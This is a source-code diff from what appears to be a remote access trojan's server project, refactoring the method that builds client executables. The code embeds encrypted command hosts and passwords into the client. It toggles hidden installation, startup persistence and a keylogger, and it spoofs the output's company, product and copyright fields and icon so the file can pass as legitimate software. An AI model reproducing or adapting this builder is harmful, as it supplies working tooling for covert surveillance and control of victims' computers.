@@ -1,9 +1,9 @@
 ﻿using System;
-using System.IO;
 using Mono.Cecil;
 using Mono.Cecil.Cil;
 using Vestris.ResourceLib;
 using xServer.Core.Cryptography;
+using xServer.Core.Data;
 using xServer.Core.Helper;
 
 namespace xServer.Core.Build
@@ -14,31 +14,12 @@ namespace xServer.Core.Build
     public static class ClientBuilder
     {
         /// <summary>
-        /// Builds a client executable. Assumes that the binaries for the client exist.
+        /// Builds a client executable.
         /// </summary>
-        /// <param name="output">The name of the final file.</param>
-        /// <param name="tag">The tag to identify the client.</param>
-        /// <param name="host">The raw host list.</param>
-        /// <param name="password">The password that is used to connect to the website.</param>
-        /// <param name="installsub">The sub-folder to install the client.</param>
-        /// <param name="installname">Name of the installed executable.</param>
-        /// <param name="mutex">The client's mutex</param>
-        /// <param name="startupkey">The registry key to add for running on startup.</param>
-        /// <param name="install">Decides whether to install the client on the machine.</param>
-        /// <param name="startup">Determines whether to add the program to startup.</param>
-        /// <param name="hidefile">Determines whether to hide the file.</param>
-        /// <param name="keylogger">Determines if keylogging functionality should be activated.</param>
-        /// <param name="reconnectdelay">The amount the client will wait until attempting to reconnect.</param>
-        /// <param name="installpath">The installation path of the client.</param>
-        /// <param name="iconpath">The path to the icon for the client.</param>
-        /// <param name="asminfo">Information about the client executable's assembly information.</param>
-        /// <param name="version">The version number of the client.</param>
-        /// <exception cref="System.Exception">Thrown if the builder was unable to rename the client executable.</exception>
-        /// <exception cref="System.ArgumentException">Thrown if an invalid special folder was specified.</exception>
-        /// <exception cref="System.IO.FileLoadException">Thrown if the client binaries do not exist.</exception>
-        public static void Build(string output, string tag, string host, string password, string installsub, string installname,
-            string mutex, string startupkey, bool install, bool startup, bool hidefile, bool keylogger,
-            int reconnectdelay, int installpath, string iconpath, string[] asminfo, string version)
+        /// <remarks>
+        /// Assumes the 'client.bin' file exist.
+        /// </remarks>
+        public static void Build(BuildOptions options)
         {
             // PHASE 1 - Settings
             string encKey = FileHelper.GetRandomFilename(20);
@@ -61,31 +42,31 @@ namespace xServer.Core.Build
                                     switch (strings)
                                     {
                                         case 1: //version
-                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(version, encKey);
+                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(options.Version, encKey);
                                             break;
                                         case 2: //ip/hostname
-                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(host, encKey);
+                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(options.RawHosts, encKey);
                                             break;
                                         case 3: //password
-                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(password, encKey);
+                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(options.Password, encKey);
                                             break;
                                         case 4: //installsub
-                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(installsub, encKey);
+                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(options.InstallSub, encKey);
                                             break;
                                         case 5: //installname
-                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(installname, encKey);
+                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(options.InstallName, encKey);
                                             break;
                                         case 6: //mutex
-                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(mutex, encKey);
+                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(options.Mutex, encKey);
                                             break;
                                         case 7: //startupkey
-                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(startupkey, encKey);
+                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(options.StartupName, encKey);
                                             break;
                                         case 8: //encryption key
                                             methodDef.Body.Instructions[i].Operand = encKey;
                                             break;
                                         case 9: //tag
-                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(tag, encKey);
+                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(options.Tag, encKey);
                                             break;
                                     }
                                     strings++;
@@ -96,16 +77,16 @@ namespace xServer.Core.Build
                                     switch (bools)
                                     {
                                         case 1: //install
-                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(install));
+                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(options.Install));
                                             break;
                                         case 2: //startup
-                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(startup));
+                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(options.Startup));
                                             break;
                                         case 3: //hidefile
-                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(hidefile));
+                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(options.HideFile));
                                             break;
                                         case 4: //Keylogger
-                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(keylogger));
+                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(options.Keylogger));
                                             break;
                                     }
                                     bools++;
@@ -113,11 +94,11 @@ namespace xServer.Core.Build
                                 else if (methodDef.Body.Instructions[i].OpCode.Name == "ldc.i4") // int
                                 {
                                     //reconnectdelay
-                                    methodDef.Body.Instructions[i].Operand = reconnectdelay;
+                                    methodDef.Body.Instructions[i].Operand = options.Delay;
                                 }
                                 else if (methodDef.Body.Instructions[i].OpCode.Name == "ldc.i4.s") // sbyte
                                 {
-                                    methodDef.Body.Instructions[i].Operand = GetSpecialFolder(installpath);
+                                    methodDef.Body.Instructions[i].Operand = GetSpecialFolder(options.InstallPath);
                                 }
                             }
                         }
@@ -132,36 +113,36 @@ namespace xServer.Core.Build
                 throw new Exception("renaming failed");
 
             // PHASE 3 - Saving
-            r.AsmDef.Write(output);
+            r.AsmDef.Write(options.OutputPath);
 
             // PHASE 4 - Assembly Information changing
-            if (asminfo != null)
+            if (options.AssemblyInformation != null)
             {
                 VersionResource versionResource = new VersionResource();
-                versionResource.LoadFrom(output);
+                versionResource.LoadFrom(options.OutputPath);
 
-                versionResource.FileVersion = asminfo[7];
-                versionResource.ProductVersion = asminfo[6];
+                versionResource.FileVersion = options.AssemblyInformation[7];
+                versionResource.ProductVersion = options.AssemblyInformation[6];
                 versionResource.Language = 0;
 
                 StringFileInfo stringFileInfo = (StringFileInfo) versionResource["StringFileInfo"];
-                stringFileInfo["CompanyName"] = asminfo[2];
-                stringFileInfo["FileDescription"] = asminfo[1];
-                stringFileInfo["ProductName"] = asminfo[0];
-                stringFileInfo["LegalCopyright"] = asminfo[3];
-                stringFileInfo["LegalTrademarks"] = asminfo[4];
+                stringFileInfo["CompanyName"] = options.AssemblyInformation[2];
+                stringFileInfo["FileDescription"] = options.AssemblyInformation[1];
+                stringFileInfo["ProductName"] = options.AssemblyInformation[0];
+                stringFileInfo["LegalCopyright"] = options.AssemblyInformation[3];
+                stringFileInfo["LegalTrademarks"] = options.AssemblyInformation[4];
                 stringFileInfo["ProductVersion"] = versionResource.ProductVersion;
                 stringFileInfo["FileVersion"] = versionResource.FileVersion;
                 stringFileInfo["Assembly Version"] = versionResource.ProductVersion;
-                stringFileInfo["InternalName"] = asminfo[5];
-                stringFileInfo["OriginalFilename"] = asminfo[5];
+                stringFileInfo["InternalName"] = options.AssemblyInformation[5];
+                stringFileInfo["OriginalFilename"] = options.AssemblyInformation[5];
 
-                versionResource.SaveTo(output);
+                versionResource.SaveTo(options.OutputPath);
             }
 
             // PHASE 5 - Icon changing
-            if (!string.IsNullOrEmpty(iconpath))
-                IconInjector.InjectIcon(output, iconpath);
+            if (!string.IsNullOrEmpty(options.IconPath))
+                IconInjector.InjectIcon(options.OutputPath, options.IconPath);
         }
 
         /// <summary>
